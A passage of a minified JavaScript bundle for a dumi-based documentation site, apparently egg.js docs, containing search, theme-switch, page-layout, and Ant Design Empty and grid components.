n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?x(e,t):void 0}}function x(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function j(e,t){var n=null==e?null:"undefined"!==typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l=[],o=!0,i=!1;try{for(n=n.call(e);!(o=(a=n.next()).done);o=!0)if(l.push(a.value),t&&l.length===t)break}catch(c){i=!0,r=c}finally{try{o||null==n["return"]||n["return"]()}finally{if(i)throw r}}return l}}function S(e){if(Array.isArray(e))return e}var C=function(e,t){var n=t.toLowerCase().indexOf(e.toLowerCase()),a=e.length;return r.a.createElement(r.a.Fragment,null,t.substring(0,n),r.a.createElement("span",{className:"__dumi-default-search-highlight"},t.substring(n,n+a)),t.substring(n+a,t.length))},A=function(){var e=Object(a["useState"])(""),t=y(e,2),n=t[0],o=t[1],i=Object(a["useState"])([]),c=y(i,2),s=c[0],u=c[1],d=Object(a["useRef"])(),m=Object(l["useSearch"])(n),p=r.a.createElement("svg",{className:"__dumi-default-search-empty",viewBox:"0 0 1024 1024",version:"1.1",xmlns:"http://www.w3.org/2000/svg","p-id":"2347",width:"32",height:"32"},r.a.createElement("path",{d:"M855.6 427.2H168.5c-12.7 0-24.4 6.9-30.6 18L4.4 684.7C1.5 689.9 0 695.8 0 701.8v287.1c0 19.4 15.7 35.1 35.1 35.1H989c19.4 0 35.1-15.7 35.1-35.1V701.8c0-6-1.5-11.8-4.4-17.1L886.2 445.2c-6.2-11.1-17.9-18-30.6-18zM673.4 695.6c-16.5 0-30.8 11.5-34.3 27.7-12.7 58.5-64.8 102.3-127.2 102.3s-114.5-43.8-127.2-102.3c-3.5-16.1-17.8-27.7-34.3-27.7H119c-26.4 0-43.3-28-31.1-51.4l81.7-155.8c6.1-11.6 18-18.8 31.1-18.8h622.4c13 0 25 7.2 31.1 18.8l81.7 155.8c12.2 23.4-4.7 51.4-31.1 51.4H673.4zM819.9 209.5c-1-1.8-2.1-3.7-3.2-5.5-9.8-16.6-31.1-22.2-47.8-12.6L648.5 261c-17 9.8-22.7 31.6-12.6 48.4 0.9 1.4 1.7 2.9 2.5 4.4 9.5 17 31.2 22.8 48 13L807 257.3c16.7-9.7 22.4-31 12.9-47.8zM375.4 261.1L255 191.6c-16.7-9.6-38-4-47.8 12.6-1.1 1.8-2.1 3.6-3.2 5.5-9.5 16.8-3.8 38.1 12.9 47.8L337.3 327c16.9 9.7 38.6 4 48-13.1 0.8-1.5 1.7-2.9 2.5-4.4 10.2-16.8 4.5-38.6-12.4-48.4zM512 239.3h2.5c19.5 0.3 35.5-15.5 35.5-35.1v-139c0-19.3-15.6-34.9-34.8-35.1h-6.4C489.6 30.3 474 46 474 65.2v139c0 19.5 15.9 35.4 35.5 35.1h2.5z"}));return Object(a["useEffect"])((function(){Array.isArray(m)?u(m):"function"===typeof m&&m(".".concat(d.current.className))}),[m]),r.a.createElement("div",{className:"__dumi-default-search"},r.a.createElement("input",v({className:"__dumi-default-search-input",type:"search",ref:d},Array.isArray(m)?{value:n,onChange:function(e){return o(e.target.value)}}:{})),r.a.createElement("ul",null,s.length>0&&s.map((function(e){var t;return r.a.createElement("li",{key:e.path,onClick:function(){return o("")}},r.a.createElement(l["AnchorLink"],{to:e.path},(null===(t=e.parent)||void 0===t?void 0:t.title)&&r.a.createElement("span",null,e.parent.title),C(n,e.title)))})),0===s.length&&n&&r.a.createElement("li",{style:{textAlign:"center"}},p)))};n("2XeM");function L(e,t){return P(e)||I(e,t)||N(e,t)||T()}function T(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function N(e,t){if(e){if("string"===typeof e)return O(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?O(e,t):void 0}}function O(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function I(e,t){var n=null==e?null:"undefined"!==typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l=[],o=!0,i=!1;try{for(n=n.call(e);!(o=(a=n.next()).done);o=!0)if(l.push(a.value),t&&l.length===t)break}catch(c){i=!0,r=c}finally{try{o||null==n["return"]||n["return"]()}finally{if(i)throw r}}return l}}function P(e){if(Array.isArray(e))return e}var R=function(e){var t=e.darkSwitch,n=e.onDarkSwitchClick,a=e.isSideMenu,o=["dark","light","auto"],i=Object(l["usePrefersColor"])(),c=L(i,2),s=c[0],u=c[1],d=s,m=r.a.createElement("svg",{viewBox:"0 0 1024 1024",version:"1.1",xmlns:"http://www.w3.org/2000/svg","p-id":"4026",width:"22",height:"22"},r.a.createElement("path",{d:"M915.2 476.16h-43.968c-24.704 0-44.736 16-44.736 35.84s20.032 35.904 44.736 35.904H915.2c24.768 0 44.8-16.064 44.8-35.904s-20.032-35.84-44.8-35.84zM512 265.6c-136.704 0-246.464 109.824-246.464 246.4 0 136.704 109.76 246.464 246.464 246.464S758.4 648.704 758.4 512c0-136.576-109.696-246.4-246.4-246.4z m0 425.6c-99.008 0-179.2-80.128-179.2-179.2 0-98.944 80.192-179.2 179.2-179.2S691.2 413.056 691.2 512c0 99.072-80.192 179.2-179.2 179.2zM197.44 512c0-19.84-19.136-35.84-43.904-35.84H108.8c-24.768 0-44.8 16-44.8 35.84s20.032 35.904 44.8 35.904h44.736c24.768 0 43.904-16.064 43.904-35.904zM512 198.464c19.776 0 35.84-20.032 35.84-44.8v-44.8C547.84 84.032 531.84 64 512 64s-35.904 20.032-35.904 44.8v44.8c0 24.768 16.128 44.864 35.904 44.864z m0 627.136c-19.776 0-35.904 20.032-35.904 44.8v44.736C476.096 940.032 492.16 960 512 960s35.84-20.032 35.84-44.8v-44.736c0-24.768-16.064-44.864-35.84-44.864z m329.92-592.832c17.472-17.536 20.288-43.072 6.4-57.024-14.016-14.016-39.488-11.2-57.024 6.336-4.736 4.864-26.496 26.496-31.36 31.36-17.472 17.472-20.288 43.008-6.336 57.024 13.952 14.016 39.488 11.2 57.024-6.336 4.8-4.864 26.496-26.56 31.296-31.36zM213.376 759.936c-4.864 4.8-26.56 26.624-31.36 31.36-17.472 17.472-20.288 42.944-6.4 56.96 14.016 13.952 39.552 11.2 57.024-6.336 4.8-4.736 26.56-26.496 31.36-31.36 17.472-17.472 20.288-43.008 6.336-56.96-14.016-13.952-39.552-11.072-56.96 6.336z m19.328-577.92c-17.536-17.536-43.008-20.352-57.024-6.336-14.08 14.016-11.136 39.488 6.336 57.024 4.864 4.864 26.496 26.56 31.36 31.424 17.536 17.408 43.008 20.288 56.96 6.336 14.016-14.016 11.264-39.488-6.336-57.024-4.736-4.864-26.496-26.56-31.296-31.424z m527.168 628.608c4.864 4.864 26.624 26.624 31.36 31.424 17.536 17.408 43.072 20.224 57.088 6.336 13.952-14.016 11.072-39.552-6.4-57.024-4.864-4.8-26.56-26.496-31.36-31.36-17.472-17.408-43.072-20.288-57.024-6.336-13.952 14.016-11.008 39.488 6.336 56.96z","p-id":"4027"})),p=r.a.createElement("svg",{viewBox:"0 0 1024 1024",version:"1.1",xmlns:"http://www.w3.org/2000/svg","p-id":"3854",width:"22",height:"22"},r.a.createElement("path",{d:"M991.816611 674.909091a69.166545 69.166545 0 0 0-51.665455-23.272727 70.795636 70.795636 0 0 0-27.438545 5.585454A415.674182 415.674182 0 0 1 754.993338 698.181818c-209.594182 0-393.472-184.785455-393.472-395.636363 0-52.363636 38.539636-119.621818 69.515637-173.614546 4.887273-8.610909 9.634909-16.756364 14.103272-24.901818A69.818182 69.818182 0 0 0 384.631156 0a70.842182 70.842182 0 0 0-27.438545 5.585455C161.678429 90.298182 14.362065 307.898182 14.362065 512c0 282.298182 238.824727 512 532.38691 512a522.286545 522.286545 0 0 0 453.957818-268.334545A69.818182 69.818182 0 0 0 991.816611 674.909091zM546.679156 954.181818c-248.785455 0-462.941091-192-462.941091-442.181818 0-186.647273 140.637091-372.829091 300.939637-442.181818-36.817455 65.629091-92.578909 151.970909-92.578909 232.727273 0 250.181818 214.109091 465.454545 462.917818 465.454545a488.331636 488.331636 0 0 0 185.181091-46.545455 453.003636 453.003636 0 0 1-393.565091 232.727273z m103.656728-669.323636l-14.266182 83.781818a34.909091 34.909091 0 0 0 50.362182 36.770909l74.775272-39.563636 74.752 39.563636a36.142545 36.142545 0 0 0 16.174546 3.956364 34.909091 34.909091 0 0 0 34.210909-40.727273l-14.289455-83.781818 60.509091-59.345455a35.025455 35.025455 0 0 0-19.223272-59.578182l-83.61891-12.101818-37.376-76.101818a34.56 34.56 0 0 0-62.254545 0l-37.376 76.101818-83.618909 12.101818a34.909091 34.909091 0 0 0-19.246546 59.578182z m70.423272-64.698182a34.280727 34.280727 0 0 0 26.135273-19.083636l14.312727-29.090909 14.336 29.090909a34.257455 34.257455 0 0 0 26.135273 19.083636l32.046546 4.887273-23.272728 22.574545a35.234909 35.234909 0 0 0-10.007272 30.952727l5.46909 32.116364-28.625454-15.127273a34.490182 34.490182 0 0 0-32.302546 0l-28.695272 15.127273 5.469091-32.116364a35.141818 35.141818 0 0 0-9.984-30.952727l-23.272728-22.574545z","p-id":"3855"})),h=r.a.createElement("svg",{viewBox:"0 0 1024 1024",version:"1.1",xmlns:"http://www.w3.org/2000/svg","p-id":"11002",width:"22",height:"22"},r.a.createElement("path",{d:"M127.658667 492.885333c0-51.882667 10.24-101.717333 30.378666-149.162666s47.786667-88.064 81.92-122.538667 75.093333-61.781333 122.538667-81.92 96.938667-30.378667 149.162667-30.378667 101.717333 10.24 149.162666 30.378667 88.405333 47.786667 122.88 81.92 61.781333 75.093333 81.92 122.538667 30.378667 96.938667 30.378667 149.162666-10.24 101.717333-30.378667 149.162667-47.786667 88.405333-81.92 122.88-75.093333 61.781333-122.88 81.92-97.28 30.378667-149.162666 30.378667-101.717333-10.24-149.162667-30.378667-88.064-47.786667-122.538667-81.92-61.781333-75.093333-81.92-122.88-30.378667-96.938667-30.378666-149.162667z m329.045333 0c0 130.048 13.994667 244.394667 41.984 343.381334h12.970667c46.762667 0 91.136-9.216 133.461333-27.306667s78.848-42.666667 109.568-73.386667 54.954667-67.242667 73.386667-109.568 27.306667-86.698667 27.306666-133.461333c0-46.421333-9.216-90.794667-27.306666-133.12s-42.666667-78.848-73.386667-109.568-67.242667-54.954667-109.568-73.386667-86.698667-27.306667-133.461333-27.306666h-11.605334c-28.672 123.562667-43.349333 237.909333-43.349333 343.722666z","p-id":"11003"})),g=o.filter((function(e){return e!==d})),f=function(e,t){!a&&n&&n(e),t!==d&&u(t)},E=function(e){switch(e){case"dark":return r.a.createElement("button",{key:"dumi-dark-btn-moon",title:"Dark theme",onClick:function(t){return f(t,e)},className:"__dumi-default-dark-moon ".concat(e===d?"__dumi-default-dark-switch-active":"")},p);case"light":return r.a.createElement("button",{key:"dumi-dark-btn-sun",title:"Light theme",onClick:function(t){return f(t,e)},className:"__dumi-default-dark-sun ".concat(e===d?"__dumi-default-dark-switch-active":"")},m);case"auto":return r.a.createElement("button",{key:"dumi-dark-btn-auto",title:"Default to system",onClick:function(t){return f(t,e)},className:"__dumi-default-dark-auto ".concat(e===d?"__dumi-default-dark-switch-active":"")},h);default:}};return r.a.createElement("div",{className:"__dumi-default-dark"},r.a.createElement("div",{className:"__dumi-default-dark-switch ".concat(!a&&t?"__dumi-default-dark-switch-open":"")},a?o.map((function(e){return E(e)})):E(d)),!a&&t&&r.a.createElement("div",{className:"__dumi-default-dark-switch-list"},g.map((function(e){return E(e)}))))},_=R;n("lgSZ");function q(e,t){return z(e)||U(e,t)||F(e,t)||M()}function M(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function F(e,t){if(e){if("string"===typeof e)return D(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?D(e,t):void 0}}function D(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function U(e,t){var n=null==e?null:"undefined"!==typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l=[],o=!0,i=!1;try{for(n=n.call(e);!(o=(a=n.next()).done);o=!0)if(l.push(a.value),t&&l.length===t)break}catch(c){i=!0,r=c}finally{try{o||null==n["return"]||n["return"]()}finally{if(i)throw r}}return l}}function z(e){if(Array.isArray(e))return e}var H=function(e){return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"__dumi-default-layout-hero"},e.image&&r.a.createElement("img",{src:e.image}),r.a.createElement("h1",null,e.title),r.a.createElement("div",{dangerouslySetInnerHTML:{__html:e.desc}}),e.actions&&e.actions.map((function(e){return r.a.createElement(l["Link"],{to:e.link,key:e.text},r.a.createElement("button",{type:"button"},e.text))}))))},B=function(e){return r.a.createElement("div",{className:"__dumi-default-layout-features"},e.map((function(e){return r.a.createElement("dl",{key:e.title,style:{backgroundImage:e.icon?"url(".concat(e.icon,")"):void 0}},e.link?r.a.createElement(l["Link"],{to:e.link},r.a.createElement("dt",null,e.title)):r.a.createElement("dt",null,e.title),r.a.createElement("dd",{dangerouslySetInnerHTML:{__html:e.desc}}))})))},W=function(e){var t,n,o=e.children,i=e.location,c=Object(a["useContext"])(l["context"]),s=c.config,d=s.mode,m=s.repository,p=(c.nav,c.meta),h=c.locale,g=m.url,E=m.branch,v=m.platform,y=Object(a["useState"])(!0),k=q(y,2),w=k[0],x=k[1],j=Object(a["useState"])(!1),S=q(j,2),C=S[0],L=S[1],T="site"===d,N=T&&p.hero,O=T&&p.features,I=!1!==p.sidemenu&&!N&&!O&&!p.gapless,P=!N&&!O&&Boolean(null===(t=p.slugs)||void 0===t?void 0:t.length)&&("content"===p.toc||void 0===p.toc)&&!p.gapless,R=/^zh|cn$/i.test(h),M=new Date(p.updatedTime),F="".concat(M.toLocaleDateString([],{hour12:!1})," ").concat(M.toLocaleTimeString([],{hour12:!1})),D={github:"GitHub",gitlab:"GitLab"}[(null===(n=(g||"").match(/(github|gitlab)/))||void 0===n?void 0:n[1])||"nothing"]||v;return r.a.createElement("div",{className:"__dumi-default-layout","data-route":i.pathname,"data-show-sidemenu":String(I),"data-show-slugs":String(P),"data-site-mode":T,"data-gapless":String(!!p.gapless),onClick:function(){L(!1),w||x(!0)}},r.a.createElement(u,{location:i,navPrefix:r.a.createElement(A,null),darkPrefix:r.a.createElement(_,{darkSwitch:C,onDarkSwitchClick:function(e){L((function(e){return!e})),e.stopPropagation()},isSideMenu:!1}),onMobileMenuClick:function(e){x((function(e){return!e})),e.stopPropagation()}}),r.a.createElement(b,{darkPrefix:r.a.createElement(_,{darkSwitch:C,isSideMenu:!0}),mobileMenuCollapsed:w,location:i}),P&&r.a.createElement(f,{slugs:p.slugs,className:"__dumi-default-layout-toc"}),N&&H(p.hero),O&&B(p.features),r.a.createElement("div",{className:"__dumi-default-layout-content"},o,!N&&!O&&p.filePath&&!p.gapless&&r.a.createElement("div",{className:"__dumi-default-layout-footer-meta"},D&&r.a.createElement(l["Link"],{to:"".concat(g,"/edit/").concat(E,"/").concat(p.filePath)},R?"\u5728 ".concat(D," \u4e0a\u7f16\u8f91\u6b64\u9875"):"Edit this doc on ".concat(D)),r.a.createElement("span",{"data-updated-text":R?"\u6700\u540e\u66f4\u65b0\u65f6\u95f4\uff1a":"Last update: "},F)),(N||O)&&p.footer&&r.a.createElement("div",{className:"__dumi-default-layout-footer",dangerouslySetInnerHTML:{__html:p.footer}})))},V=W,$=function(e){var t=e.data,n=t.info,a=t.guide,l=t.promo;return r.a.createElement("div",{className:"__dumi-egg-intro"},r.a.createElement("div",{className:"__dumi-egg-intro-wrap"},a&&r.a.createElement("div",{className:"__dumi-egg-intro-logo"},r.a.createElement("a",{href:a.link},r.a.createElement("img",{src:"https://zos.alipayobjects.com/rmsportal/JFKAMfmPehWfhBPdCjrw.svg"}))),r.a.createElement("div",{className:"__dumi-egg-intro-info"},n&&r.a.createElement(r.a.Fragment,null,r.a.createElement("h1",null,r.a.createElement("p",{className:"__dumi-egg-intro-info-stronge"},n.title),n.desc),r.a.createElement("p",null,n.content)),a&&r.a.createElement("div",{className:"__dumi-egg-intro-buttons"},r.a.createElement("a",{className:"__dumi-egg-intro-button __dumi-egg-intro-button-primary",href:a.link},a.title),r.a.createElement("a",{className:"__dumi-egg-intro-button __dumi-egg-intro-button-secondary",href:"https://github.com/eggjs/egg/"},"GitHub")),l&&r.a.createElement("div",{className:"__dumi-egg-intro-promote"},l.logo?r.a.createElement("img",{src:l.logo}):null,r.a.createElement("a",{href:l.link,target:"_blank"},l.title," >")))))},G=$,X=n("VGJu"),Q=n("2EJr"),K=n("qPib"),J=n("0YMn"),Y=n("nzxN"),Z=n("VGn1"),ee=n.n(Z),te=n("2HmL"),ne=n("EAg7"),ae=function(){var e=a["useContext"](te["b"]),t=e.getPrefixCls,n=t("empty-img-default");return a["createElement"]("svg",{className:n,width:"184",height:"152",viewBox:"0 0 184 152",xmlns:"http://www.w3.org/2000/svg"},a["createElement"]("g",{fill:"none",fillRule:"evenodd"},a["createElement"]("g",{transform:"translate(24 31.67)"},a["createElement"]("ellipse",{className:"".concat(n,"-ellipse"),cx:"67.797",cy:"106.89",rx:"67.797",ry:"12.668"}),a["createElement"]("path",{className:"".concat(n,"-path-1"),d:"M122.034 69.674L98.109 40.229c-1.148-1.386-2.826-2.225-4.593-2.225h-51.44c-1.766 0-3.444.839-4.592 2.225L13.56 69.674v15.383h108.475V69.674z"}),a["createElement"]("path",{className:"".concat(n,"-path-2"),d:"M101.537 86.214L80.63 61.102c-1.001-1.207-2.507-1.867-4.048-1.867H31.724c-1.54 0-3.047.66-4.048 1.867L6.769 86.214v13.792h94.768V86.214z",transform:"translate(13.56)"}),a["createElement"]("path",{className:"".concat(n,"-path-3"),d:"M33.83 0h67.933a4 4 0 0 1 4 4v93.344a4 4 0 0 1-4 4H33.83a4 4 0 0 1-4-4V4a4 4 0 0 1 4-4z"}),a["createElement"]("path",{className:"".concat(n,"-path-4"),d:"M42.678 9.953h50.237a2 2 0 0 1 2 2V36.91a2 2 0 0 1-2 2H42.678a2 2 0 0 1-2-2V11.953a2 2 0 0 1 2-2zM42.94 49.767h49.713a2.262 2.262 0 1 1 0 4.524H42.94a2.262 2.262 0 0 1 0-4.524zM42.94 61.53h49.713a2.262 2.262 0 1 1 0 4.525H42.94a2.262 2.262 0 0 1 0-4.525zM121.813 105.032c-.775 3.071-3.497 5.36-6.735 5.36H20.515c-3.238 0-5.96-2.29-6.734-5.36a7.309 7.309 0 0 1-.222-1.79V69.675h26.318c2.907 0 5.25 2.448 5.25 5.42v.04c0 2.971 2.37 5.37 5.277 5.37h34.785c2.907 0 5.277-2.421 5.277-5.393V75.1c0-2.972 2.343-5.426 5.25-5.426h26.318v33.569c0 .617-.077 1.216-.221 1.789z"})),a["createElement"]("path",{className:"".concat(n,"-path-5"),d:"M149.121 33.292l-6.83 2.65a1 1 0 0 1-1.317-1.23l1.937-6.207c-2.589-2.944-4.109-6.534-4.109-10.408C138.802 8.102 148.92 0 161.402 0 173.881 0 184 8.102 184 18.097c0 9.995-10.118 18.097-22.599 18.097-4.528 0-8.744-1.066-12.28-2.902z"}),a["createElement"]("g",{className:"".concat(n,"-g"),transform:"translate(149.65 15.383)"},a["createElement"]("ellipse",{cx:"20.654",cy:"3.167",rx:"2.849",ry:"2.815"}),a["createElement"]("path",{d:"M5.698 5.63H0L2.898.704zM9.259.704h4.985V5.63H9.259z"}))))},re=ae,le=function(){var e=a["useContext"](te["b"]),t=e.getPrefixCls,n=t("empty-img-simple");return a["createElement"]("svg",{className:n,width:"64",height:"41",viewBox:"0 0 64 41",xmlns:"http://www.w3.org/2000/svg"},a["createElement"]("g",{transform:"translate(0 1)",fill:"none",fillRule:"evenodd"},a["createElement"]("ellipse",{className:"".concat(n,"-ellipse"),cx:"32",cy:"33",rx:"32",ry:"7"}),a["createElement"]("g",{className:"".concat(n,"-g"),fillRule:"nonzero"},a["createElement"]("path",{d:"M55 12.76L44.854 1.258C44.367.474 43.656 0 42.907 0H21.093c-.749 0-1.46.474-1.947 1.257L9 12.761V22h46v-9.24z"}),a["createElement"]("path",{d:"M41.613 15.931c0-1.605.994-2.93 2.227-2.931H55v18.137C55 33.26 53.68 35 52.05 35h-40.1C10.32 35 9 33.259 9 31.137V13h11.16c1.233 0 2.227 1.323 2.227 2.928v.022c0 1.605 1.005 2.901 2.237 2.901h14.752c1.232 0 2.237-1.308 2.237-2.913v-.007z",className:"".concat(n,"-path")}))))},oe=le,ie=function(e,t){var n={};for(var a in e)Object.prototype.hasOwnProperty.call(e,a)&&t.indexOf(a)<0&&(n[a]=e[a]);if(null!=e&&"function"===typeof Object.getOwnPropertySymbols){var r=0;for(a=Object.getOwnPropertySymbols(e);r<a.length;r++)t.indexOf(a[r])<0&&Object.prototype.propertyIsEnumerable.call(e,a[r])&&(n[a[r]]=e[a[r]])}return n},ce=a["createElement"](re,null),se=a["createElement"](oe,null),ue=function(e){var t=e.className,n=e.prefixCls,r=e.image,l=void 0===r?ce:r,o=e.description,i=e.children,c=e.imageStyle,s=ie(e,["className","prefixCls","image","description","children","imageStyle"]),u=a["useContext"](te["b"]),d=u.getPrefixCls,m=u.direction;return a["createElement"](ne["a"],{componentName:"Empty"},(function(e){var r,u=d("empty",n),p="undefined"!==typeof o?o:e.description,h="string"===typeof p?p:"empty",g=null;return g="string"===typeof l?a["createElement"]("img",{alt:h,src:l}):l,a["createElement"]("div",Object(Q["a"])({className:ee()(u,(r={},Object(K["a"])(r,"".concat(u,"-normal"),l===se),Object(K["a"])(r,"".concat(u,"-rtl"),"rtl"===m),r),t)},s),a["createElement"]("div",{className:"".concat(u,"-image"),style:c},g),p&&a["createElement"]("div",{className:"".concat(u,"-description")},p),i&&a["createElement"]("div",{className:"".concat(u,"-footer")},i))}))};ue.PRESENTED_IMAGE_DEFAULT=ce,ue.PRESENTED_IMAGE_SIMPLE=se;var de,me=ue,pe=function(e){return a["createElement"](te["a"],null,(function(t){var n=t.getPrefixCls,r=n("empty");switch(e){case"Table":case"List":return a["createElement"](me,{image:me.PRESENTED_IMAGE_SIMPLE});case"Select":case"TreeSelect":case"Cascader":case"Transfer":case"Mentions":return a["createElement"](me,{image:me.PRESENTED_IMAGE_SIMPLE,className:"".concat(r,"-small")});default:return a["createElement"](me,null)}}))},he=pe,ge=n("d9lq"),fe=(n("nnPr"),function(){return Object(ge["a"])()&&window.document.documentElement}),Ee=function(){if(!fe())return!1;if(void 0!==de)return de;var e=document.createElement("div");return e.style.display="flex",e.style.flexDirection="column",e.style.rowGap="1px",e.appendChild(document.createElement("div")),e.appendChild(document.createElement("div")),document.body.appendChild(e),de=1===e.scrollHeight,document.body.removeChild(e),de},be=function(){var e=a["useState"](!1),t=Object(J["a"])(e,2),n=t[0],r=t[1];return a["useEffect"]((function(){r(Ee())}),[]),n},ve=["xxl","xl","lg","md","sm","xs"],ye={xs:"(max-width: 575px)",sm:"(min-width: 576px)",md:"(min-width: 768px)",lg:"(min-width: 992px)",xl:"(min-width: 1200px)",xxl:"(min-width: 1600px)"},ke=new Map,we=-1,xe={},je={matchHandlers:{},dispatch:function(e){return xe=e,ke.forEach((function(e){return e(xe)})),ke.size>=1},subscribe:function(e){return ke.size||this.register(),we+=1,ke.set(we,e),e(xe),we},unsubscribe:function(e){ke["delete"](e),ke.size||this.unregister()},unregister:function(){var e=this;Object.keys(ye).forEach((function(t){var n=ye[t],a=e.matchHandlers[n];null===a||void 0===a||a.mql.removeListener(null===a||void 0===a?void 0:a.listener)})),ke.clear()},register:function(){var e=this;Object.keys(ye).forEach((function(t){var n=ye[t],a=function(n){var a=n.matches;e.dispatch(Object(Q["a"])(Object(Q["a"])({},xe),Object(K["a"])({},t,a)))},r=window.matchMedia(n);r.addListener(a),e.matchHandlers[n]={mql:r,listener:a},a(r)}))}},Se=je,Ce=function(){for(var e=arguments.length,t=new Array(e),n=0;n<e;n++)t[n]=arguments[n];return t},Ae=Object(a["createContext"])({}),Le=Ae,Te=function(e,t){var n={};for(var a in e)Object.prototype.hasOwnProperty.call(e,a)&&t.indexOf(a)<0&&(n[a]=e[a]);if(null!=e&&"function"===typeof Object.getOwnPropertySymbols){var r=0;for(a=Object.getOwnPropertySymbols(e);r<a.length;r++)t.indexOf(a[r])<0&&Object.prototype.propertyIsEnumerable.call(e,a[r])&&(n[a[r]]=e[a[r]])}return n};Ce("top","middle","bottom","stretch"),Ce("start","end","center","space-around","space-between","space-evenly");function Ne(e,t){var n=a["useState"]("string"===typeof e?e:""),r=Object(J["a"])(n,2),l=r[0],o=r[1],i=function(){if("string"===typeof e&&o(e),"object"===Object(Y["a"])(e))for(var n=0;n<ve.length;n++){var a=ve[n];if(t[a]){var r=e[a];if(void 0!==r)return void o(r)}}};return a["useEffect"]((function(){i()}),[JSON.stringify(e),t]),l}var Oe=a["forwardRef"]((function(e,t){var n,r=e.prefixCls,l=e.justify,o=e.align,i=e.className,c=e.style,s=e.children,u=e.gutter,d=void 0===u?0:u,m=e.wrap,p=Te(e,["prefixCls","justify","align","className","style","children","gutter","wrap"]),h=a["useContext"](te["b"]),g=h.getPrefixCls,f=h.direction,E=a["useState"]({xs:!0,sm:!0,md:!0,lg:!0,xl:!0,xxl:!0}),b=Object(J["a"])(E,2),v=b[0],y=b[1],k=a["useState"]({xs:!1,sm:!1,md:!1,lg:!1,xl:!1,xxl:!1}),w=Object(J["a"])(k,2),x=w[0],j=w[1],S=Ne(o,x),C=Ne(l,x),A=be(),L=a["useRef"](d);a["useEffect"]((function(){var e=Se.subscribe((function(e){j(e);var t=L.current||0;(!Array.isArray(t)&&"object"===Object(Y["a"])(t)||Array.isArray(t)&&("object"===Object(Y["a"])(t[0])||"object"===Object(Y["a"])(t[1])))&&y(e)}));return function(){return Se.unsubscribe(e)}}),[]);var T=function(){var e=[void 0,void 0],t=Array.isArray(d)?d:[d,void 0];return t.forEach((function(t,n){if("object"===Object(Y["a"])(t))for(var a=0;a<ve.length;a++){var r=ve[a];if(v[r]&&void 0!==t[r]){e[n]=t[r];break}}else e[n]=t})),e},N=g("row",r),O=T(),I=ee()(N,(n={},Object(K["a"])(n,"".concat(N,"-no-wrap"),!1===m),Object(K["a"])(n,"".concat(N,"-").concat(C),C),Object(K["a"])(n,"".concat(N,"-").concat(S),S),Object(K["a"])(n,"".concat(N,"-rtl"),"rtl"===f),n),i),P={},R=null!=O[0]&&O[0]>0?O[0]/-2:void 0,_=null!=O[1]&&O[1]>0?O[1]/-2:void 0;if(R&&(P.marginLeft=R,P.marginRight=R),A){var q=Object(J["a"])(O,2);P.rowGap=q[1]}else _&&(P.marginTop=_,P.marginBottom=_);var M=Object(J["a"])(O,2),F=M[0],D=M[1],U=a["useMemo"]((function(){return{gutter:[F,D],wrap:m,supportFlexGap:A}}),[F,D,m,A]);return a["createElement"](Le.Provider,{value:U},a["createElement"]("div",Object(Q["a"])({},p,{className:I,style:Object(Q["a"])(Object(Q["a"])({},P),c),ref:t}),s))}));var Ie=Oe;function Pe(){var e=a["useReducer"]((function(e){return e+1}),0),t=Object(J["a"])(e,2),n=t[1];return n}function Re(){var e=!(arguments.length>0&&void 0!==arguments[0])||arguments[0],t=Object(a["useRef"])({}),n=Pe();return Object(a["useEffect"])((function(){var a=Se.subscribe((function(a){t.current=a,e&&n()}));return function(){return Se.unsubscribe(a)}}),[]),t.current}var _e=Re,qe=n("3Qq0"),Me={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M272.9 512l265.4-339.1c4.1-5.2.4-12.9-6.3-12.9h-77.3c-4.9 0-9.6 2.3-12.6 6.1L186.8 492.3a31.99 31.99 0 000 39.5l255.3 326.1c3 3.9 7.7 6.1 12.6 6.1H532c6.7 0 10.4-7.7 6.3-12.9L272.9 512zm304 0l265.4-339.1c4.1-5.2.4-12.9-6.3-12.9h-77.3c-4.9 0-9.6 2.3-12.6 6.1L490.8 492.3a31.99 31.99 0 000 39.5l255.3 326.1c3 3.9 7.7 6.1 12.6 6.1H836c6.7 0 10.4-7.7 6.3-12.9L576.9 512z"}}]},name:"double-left",theme:"outlined"},Fe=Me,De=n("Il1s"),Ue=function(e,t){return a["createElement"](De["a"],Object(qe["a"])(Object(qe["a"])({},e),{},{ref:t,icon:Fe}))};Ue.displayName="DoubleLeftOutlined";var ze=a["forwardRef"](Ue),He={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M533.2 492.3L277.9 166.1c-3-3.9-7.7-6.1-12.6-6.1H188c-6.7 0-10.4 7.7-6.3 12.9L447.1 512 181.7 851.1A7.98 7.98 0 00188 864h77.3c4.9 0 9.6-2.3 12.6-6.1l255.3-326.1c9.1-11.7 9.1-27.9 0-39.5zm304 0L581.9 166.1c-3-3.9-7.7-6.1-12.6-6.1H492c-6.7 0-10.4 7.7-6.3 12.9L751.1 512 485.7 851.1A7.98 7.98 0 00492 864h77.3c4.9 0 9.6-2.3 